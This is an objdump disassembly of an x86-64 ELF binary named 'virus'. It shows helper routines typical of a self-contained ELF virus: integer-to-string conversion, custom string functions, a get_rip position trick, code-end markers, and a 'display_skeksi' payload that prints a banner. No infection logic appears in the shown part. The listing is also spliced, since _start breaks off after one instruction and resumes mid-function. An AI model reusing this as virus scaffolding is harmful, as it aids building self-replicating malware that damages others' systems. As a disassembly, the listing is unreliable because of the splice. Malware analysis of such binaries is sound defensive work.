
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  40285e:	48 c1 fa 02          	sar    rdx,0x2
  402862:	48 89 c8             	mov    rax,rcx
  402865:	48 c1 f8 3f          	sar    rax,0x3f
  402869:	48 29 c2             	sub    rdx,rax
  40286c:	48 89 d0             	mov    rax,rdx
  40286f:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402873:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402877:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  40287c:	75 81                	jne    4027ff <itoa+0x17>
  40287e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402881:	48 63 d0             	movsxd rdx,eax
  402884:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402888:	48 01 d0             	add    rax,rdx
  40288b:	c6 00 00             	mov    BYTE PTR [rax],0x0
  40288e:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  402895:	e9 b5 00 00 00       	jmp    40294f <itoa+0x167>
  40289a:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40289d:	48 63 d0             	movsxd rdx,eax
  4028a0:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028a4:	48 01 d0             	add    rax,rdx
  4028a7:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028aa:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028ad:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028b0:	48 98                	cdqe   
  4028b2:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028b6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028ba:	48 01 d0             	add    rax,rdx
  4028bd:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028c0:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028c3:	48 63 d0             	movsxd rdx,eax
  4028c6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028ca:	48 01 d0             	add    rax,rdx
  4028cd:	31 ce                	xor    esi,ecx
  4028cf:	89 f2                	mov    edx,esi
  4028d1:	88 10                	mov    BYTE PTR [rax],dl
  4028d3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028d6:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028d9:	48 98                	cdqe   
  4028db:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028df:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028e3:	48 01 d0             	add    rax,rdx
  4028e6:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028e9:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028ec:	48 63 d0             	movsxd rdx,eax
  4028ef:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028f3:	48 01 d0             	add    rax,rdx
  4028f6:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028f9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028fc:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028ff:	48 98                	cdqe   
  402901:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402905:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402909:	48 01 d0             	add    rax,rdx
  40290c:	31 ce                	xor    esi,ecx
  40290e:	89 f2                	mov    edx,esi
  402910:	88 10                	mov    BYTE PTR [rax],dl
  402912:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402915:	48 63 d0             	movsxd rdx,eax
  402918:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40291c:	48 01 d0             	add    rax,rdx
  40291f:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402922:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402925:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402928:	48 98                	cdqe   
  40292a:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40292e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402932:	48 01 d0             	add    rax,rdx
  402935:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402938:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40293b:	48 63 d0             	movsxd rdx,eax
  40293e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402942:	48 01 d0             	add    rax,rdx
  402945:	31 ce                	xor    esi,ecx
  402947:	89 f2                	mov    edx,esi
  402949:	88 10                	mov    BYTE PTR [rax],dl
  40294b:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  40294f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402952:	89 c2                	mov    edx,eax
  402954:	c1 ea 1f             	shr    edx,0x1f
  402957:	01 d0                	add    eax,edx
  402959:	d1 f8                	sar    eax,1
  40295b:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  40295e:	0f 8c 36 ff ff ff    	jl     40289a <itoa+0xb2>
  402964:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402968:	5d                   	pop    rbp
  402969:	c3                   	ret    

000000000040296a <itox>:
  40296a:	f3 0f 1e fa          	endbr64 
  40296e:	55                   	push   rbp
  40296f:	48 89 e5             	mov    rbp,rsp
  402972:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402976:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40297a:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402981:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402985:	48 99                	cqo    
  402987:	48 c1 ea 3c          	shr    rdx,0x3c
  40298b:	48 01 d0             	add    rax,rdx
  40298e:	83 e0 0f             	and    eax,0xf
  402991:	48 29 d0             	sub    rax,rdx
  402994:	48 89 c1             	mov    rcx,rax
  402997:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40299a:	48 63 d0             	movsxd rdx,eax
  40299d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029a1:	48 01 d0             	add    rax,rdx
  4029a4:	89 ca                	mov    edx,ecx
  4029a6:	88 10                	mov    BYTE PTR [rax],dl
  4029a8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029ab:	48 63 d0             	movsxd rdx,eax
  4029ae:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029b2:	48 01 d0             	add    rax,rdx
  4029b5:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029b8:	3c 09                	cmp    al,0x9
  4029ba:	7e 26                	jle    4029e2 <itox+0x78>
  4029bc:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029bf:	48 63 d0             	movsxd rdx,eax
  4029c2:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029c6:	48 01 d0             	add    rax,rdx
  4029c9:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029cc:	8d 48 57             	lea    ecx,[rax+0x57]
  4029cf:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029d2:	48 63 d0             	movsxd rdx,eax
  4029d5:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029d9:	48 01 d0             	add    rax,rdx
  4029dc:	89 ca                	mov    edx,ecx
  4029de:	88 10                	mov    BYTE PTR [rax],dl
  4029e0:	eb 24                	jmp    402a06 <itox+0x9c>
  4029e2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029e5:	48 63 d0             	movsxd rdx,eax
  4029e8:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029ec:	48 01 d0             	add    rax,rdx
  4029ef:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029f2:	8d 48 30             	lea    ecx,[rax+0x30]
  4029f5:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029f8:	48 63 d0             	movsxd rdx,eax
  4029fb:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029ff:	48 01 d0             	add    rax,rdx
  402a02:	89 ca                	mov    edx,ecx
  402a04:	88 10                	mov    BYTE PTR [rax],dl
  402a06:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402a0a:	48 8d 50 0f          	lea    rdx,[rax+0xf]
  402a0e:	48 85 c0             	test   rax,rax
  402a11:	48 0f 48 c2          	cmovs  rax,rdx
  402a15:	48 c1 f8 04          	sar    rax,0x4
  402a19:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402a1d:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402a21:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402a26:	0f 85 55 ff ff ff    	jne    402981 <itox+0x17>
  402a2c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a2f:	48 63 d0             	movsxd rdx,eax
  402a32:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a36:	48 01 d0             	add    rax,rdx
  402a39:	c6 00 00             	mov    BYTE PTR [rax],0x0
  402a3c:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  402a43:	e9 b5 00 00 00       	jmp    402afd <itox+0x193>
  402a48:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a4b:	48 63 d0             	movsxd rdx,eax
  402a4e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a52:	48 01 d0             	add    rax,rdx
  402a55:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a58:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a5b:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a5e:	48 98                	cdqe   
  402a60:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a64:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a68:	48 01 d0             	add    rax,rdx
  402a6b:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a6e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a71:	48 63 d0             	movsxd rdx,eax
  402a74:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a78:	48 01 d0             	add    rax,rdx
  402a7b:	31 ce                	xor    esi,ecx
  402a7d:	89 f2                	mov    edx,esi
  402a7f:	88 10                	mov    BYTE PTR [rax],dl
  402a81:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a84:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a87:	48 98                	cdqe   
  402a89:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a8d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a91:	48 01 d0             	add    rax,rdx
  402a94:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a97:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a9a:	48 63 d0             	movsxd rdx,eax
  402a9d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aa1:	48 01 d0             	add    rax,rdx
  402aa4:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402aa7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402aaa:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402aad:	48 98                	cdqe   
  402aaf:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402ab3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ab7:	48 01 d0             	add    rax,rdx
  402aba:	31 ce                	xor    esi,ecx
  402abc:	89 f2                	mov    edx,esi
  402abe:	88 10                	mov    BYTE PTR [rax],dl
  402ac0:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402ac3:	48 63 d0             	movsxd rdx,eax
  402ac6:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aca:	48 01 d0             	add    rax,rdx
  402acd:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402ad0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402ad3:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402ad6:	48 98                	cdqe   
  402ad8:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402adc:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ae0:	48 01 d0             	add    rax,rdx
  402ae3:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402ae6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402ae9:	48 63 d0             	movsxd rdx,eax
  402aec:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402af0:	48 01 d0             	add    rax,rdx
  402af3:	31 ce                	xor    esi,ecx
  402af5:	89 f2                	mov    edx,esi
  402af7:	88 10                	mov    BYTE PTR [rax],dl
  402af9:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402afd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402b00:	89 c2                	mov    edx,eax
  402b02:	c1 ea 1f             	shr    edx,0x1f
  402b05:	01 d0                	add    eax,edx
  402b07:	d1 f8                	sar    eax,1
  402b09:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402b0c:	0f 8c 36 ff ff ff    	jl     402a48 <itox+0xde>
  402b12:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b16:	5d                   	pop    rbp
  402b17:	c3                   	ret    

0000000000402b18 <_puts>:
  402b18:	f3 0f 1e fa          	endbr64 
  402b1c:	55                   	push   rbp
  402b1d:	48 89 e5             	mov    rbp,rsp
  402b20:	48 83 ec 10          	sub    rsp,0x10
  402b24:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b28:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b2c:	48 89 c7             	mov    rdi,rax
  402b2f:	e8 7c 00 00 00       	call   402bb0 <_strlen>
  402b34:	48 89 c2             	mov    rdx,rax
  402b37:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b3b:	48 89 c6             	mov    rsi,rax
  402b3e:	bf 01 00 00 00       	mov    edi,0x1
  402b43:	e8 03 f6 ff ff       	call   40214b <_write>
  402b48:	bf 01 00 00 00       	mov    edi,0x1
  402b4d:	e8 e6 f6 ff ff       	call   402238 <_fsync>
  402b52:	b8 01 00 00 00       	mov    eax,0x1
  402b57:	c9                   	leave  
  402b58:	c3                   	ret    

0000000000402b59 <_puts_nl>:
  402b59:	f3 0f 1e fa          	endbr64 
  402b5d:	55                   	push   rbp
  402b5e:	48 89 e5             	mov    rbp,rsp
  402b61:	48 83 ec 10          	sub    rsp,0x10
  402b65:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b69:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b6d:	48 89 c7             	mov    rdi,rax
  402b70:	e8 3b 00 00 00       	call   402bb0 <_strlen>
  402b75:	48 89 c2             	mov    rdx,rax
  402b78:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b7c:	48 89 c6             	mov    rsi,rax
  402b7f:	bf 01 00 00 00       	mov    edi,0x1
  402b84:	e8 c2 f5 ff ff       	call   40214b <_write>
  402b89:	ba 01 00 00 00       	mov    edx,0x1
  402b8e:	48 8d 35 26 03 00 00 	lea    rsi,[rip+0x326]        # 402ebb <display_skeksi+0x13d>
  402b95:	bf 01 00 00 00       	mov    edi,0x1
  402b9a:	e8 ac f5 ff ff       	call   40214b <_write>
  402b9f:	bf 01 00 00 00       	mov    edi,0x1
  402ba4:	e8 8f f6 ff ff       	call   402238 <_fsync>
  402ba9:	b8 01 00 00 00       	mov    eax,0x1
  402bae:	c9                   	leave  
  402baf:	c3                   	ret    

0000000000402bb0 <_strlen>:
  402bb0:	f3 0f 1e fa          	endbr64 
  402bb4:	55                   	push   rbp
  402bb5:	48 89 e5             	mov    rbp,rsp
  402bb8:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402bbc:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
  402bc3:	00 
  402bc4:	eb 05                	jmp    402bcb <_strlen+0x1b>
  402bc6:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402bcb:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402bcf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bd3:	48 01 d0             	add    rax,rdx
  402bd6:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402bd9:	84 c0                	test   al,al
  402bdb:	75 e9                	jne    402bc6 <_strlen+0x16>
  402bdd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402be1:	5d                   	pop    rbp
  402be2:	c3                   	ret    

0000000000402be3 <_toupper>:
  402be3:	f3 0f 1e fa          	endbr64 
  402be7:	55                   	push   rbp
  402be8:	48 89 e5             	mov    rbp,rsp
  402beb:	89 f8                	mov    eax,edi
  402bed:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402bf0:	80 7d fc 60          	cmp    BYTE PTR [rbp-0x4],0x60
  402bf4:	7e 16                	jle    402c0c <_toupper+0x29>
  402bf6:	80 7d fc 7a          	cmp    BYTE PTR [rbp-0x4],0x7a
  402bfa:	7f 10                	jg     402c0c <_toupper+0x29>
  402bfc:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c00:	83 e8 20             	sub    eax,0x20
  402c03:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402c06:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c0a:	eb 04                	jmp    402c10 <_toupper+0x2d>
  402c0c:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c10:	5d                   	pop    rbp
  402c11:	c3                   	ret    

0000000000402c12 <_strncmp>:
  402c12:	f3 0f 1e fa          	endbr64 
  402c16:	55                   	push   rbp
  402c17:	48 89 e5             	mov    rbp,rsp
  402c1a:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c1e:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c22:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx
  402c26:	eb 53                	jmp    402c7b <_strncmp+0x69>
  402c28:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c2c:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c2f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c33:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c36:	38 c2                	cmp    dl,al
  402c38:	74 20                	je     402c5a <_strncmp+0x48>
  402c3a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c3e:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c41:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c45:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c48:	38 c2                	cmp    dl,al
  402c4a:	73 07                	jae    402c53 <_strncmp+0x41>
  402c4c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c51:	eb 34                	jmp    402c87 <_strncmp+0x75>
  402c53:	b8 01 00 00 00       	mov    eax,0x1
  402c58:	eb 2d                	jmp    402c87 <_strncmp+0x75>
  402c5a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c5e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c61:	84 c0                	test   al,al
  402c63:	75 07                	jne    402c6c <_strncmp+0x5a>
  402c65:	b8 00 00 00 00       	mov    eax,0x0
  402c6a:	eb 1b                	jmp    402c87 <_strncmp+0x75>
  402c6c:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c71:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c76:	48 83 6d e8 01       	sub    QWORD PTR [rbp-0x18],0x1
  402c7b:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402c80:	75 a6                	jne    402c28 <_strncmp+0x16>
  402c82:	b8 00 00 00 00       	mov    eax,0x0
  402c87:	5d                   	pop    rbp
  402c88:	c3                   	ret    

0000000000402c89 <_strcmp>:
  402c89:	f3 0f 1e fa          	endbr64 
  402c8d:	55                   	push   rbp
  402c8e:	48 89 e5             	mov    rbp,rsp
  402c91:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c95:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c99:	eb 1c                	jmp    402cb7 <_strcmp+0x2e>
  402c9b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c9f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402ca2:	84 c0                	test   al,al
  402ca4:	75 07                	jne    402cad <_strcmp+0x24>
  402ca6:	b8 00 00 00 00       	mov    eax,0x0
  402cab:	eb 3a                	jmp    402ce7 <_strcmp+0x5e>
  402cad:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402cb2:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402cb7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402cbb:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402cbe:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402cc2:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cc5:	38 c2                	cmp    dl,al
  402cc7:	74 d2                	je     402c9b <_strcmp+0x12>
  402cc9:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402ccd:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402cd0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402cd4:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cd7:	38 c2                	cmp    dl,al
  402cd9:	73 07                	jae    402ce2 <_strcmp+0x59>
  402cdb:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402ce0:	eb 05                	jmp    402ce7 <_strcmp+0x5e>
  402ce2:	b8 01 00 00 00       	mov    eax,0x1
  402ce7:	5d                   	pop    rbp
  402ce8:	c3                   	ret    

0000000000402ce9 <_memcmp>:
  402ce9:	f3 0f 1e fa          	endbr64 
  402ced:	55                   	push   rbp
  402cee:	48 89 e5             	mov    rbp,rsp
  402cf1:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402cf5:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402cf9:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cfc:	eb 35                	jmp    402d33 <_memcmp+0x4a>
  402cfe:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402d02:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d05:	88 45 ff             	mov    BYTE PTR [rbp-0x1],al
  402d08:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402d0c:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d0f:	88 45 fe             	mov    BYTE PTR [rbp-0x2],al
  402d12:	0f b6 45 ff          	movzx  eax,BYTE PTR [rbp-0x1]
  402d16:	3a 45 fe             	cmp    al,BYTE PTR [rbp-0x2]
  402d19:	74 0e                	je     402d29 <_memcmp+0x40>
  402d1b:	0f b6 55 ff          	movzx  edx,BYTE PTR [rbp-0x1]
  402d1f:	0f b6 45 fe          	movzx  eax,BYTE PTR [rbp-0x2]
  402d23:	29 c2                	sub    edx,eax
  402d25:	89 d0                	mov    eax,edx
  402d27:	eb 17                	jmp    402d40 <_memcmp+0x57>
  402d29:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402d2e:	48 83 45 e0 01       	add    QWORD PTR [rbp-0x20],0x1
  402d33:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  402d36:	8d 50 ff             	lea    edx,[rax-0x1]
  402d39:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402d3c:	85 c0                	test   eax,eax
  402d3e:	75 be                	jne    402cfe <_memcmp+0x15>
  402d40:	5d                   	pop    rbp
  402d41:	c3                   	ret    

0000000000402d42 <get_rip>:
  402d42:	f3 0f 1e fa          	endbr64 
  402d46:	55                   	push   rbp
  402d47:	48 89 e5             	mov    rbp,rsp
  402d4a:	e8 00 00 00 00       	call   402d4f <get_rip_label>

0000000000402d4f <get_rip_label>:
  402d4f:	58                   	pop    rax
  402d50:	48 89 c0             	mov    rax,rax
  402d53:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402d57:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d5b:	5d                   	pop    rbp
  402d5c:	c3                   	ret    

0000000000402d5d <end_code>:
  402d5d:	f3 0f 1e fa          	endbr64 
  402d61:	55                   	push   rbp
  402d62:	48 89 e5             	mov    rbp,rsp
  402d65:	bf 00 00 00 00       	mov    edi,0x0
  402d6a:	e8 33 f3 ff ff       	call   4020a2 <Exit>
  402d6f:	90                   	nop
  402d70:	5d                   	pop    rbp
  402d71:	c3                   	ret    

0000000000402d72 <dummy_marker>:
  402d72:	f3 0f 1e fa          	endbr64 
  402d76:	55                   	push   rbp
  402d77:	48 89 e5             	mov    rbp,rsp
  402d7a:	90                   	nop
  402d7b:	90                   	nop
  402d7c:	5d                   	pop    rbp
  402d7d:	c3                   	ret    

0000000000402d7e <display_skeksi>:
  402d7e:	f3 0f 1e fa          	endbr64 
  402d82:	55                   	push   rbp
  402d83:	48 89 e5             	mov    rbp,rsp
  402d86:	ba ed 3b 00 00       	mov    edx,0x3bed
  402d8b:	48 c7 c0 c0 2e 40 00 	mov    rax,0x402ec0
  402d92:	48 89 c6             	mov    rsi,rax
  402d95:	bf 01 00 00 00       	mov    edi,0x1
  402d9a:	e8 ac f3 ff ff       	call   40214b <_write>
  402d9f:	90                   	nop
  402da0:	5d                   	pop    rbp
  402da1:	c3                   	ret    
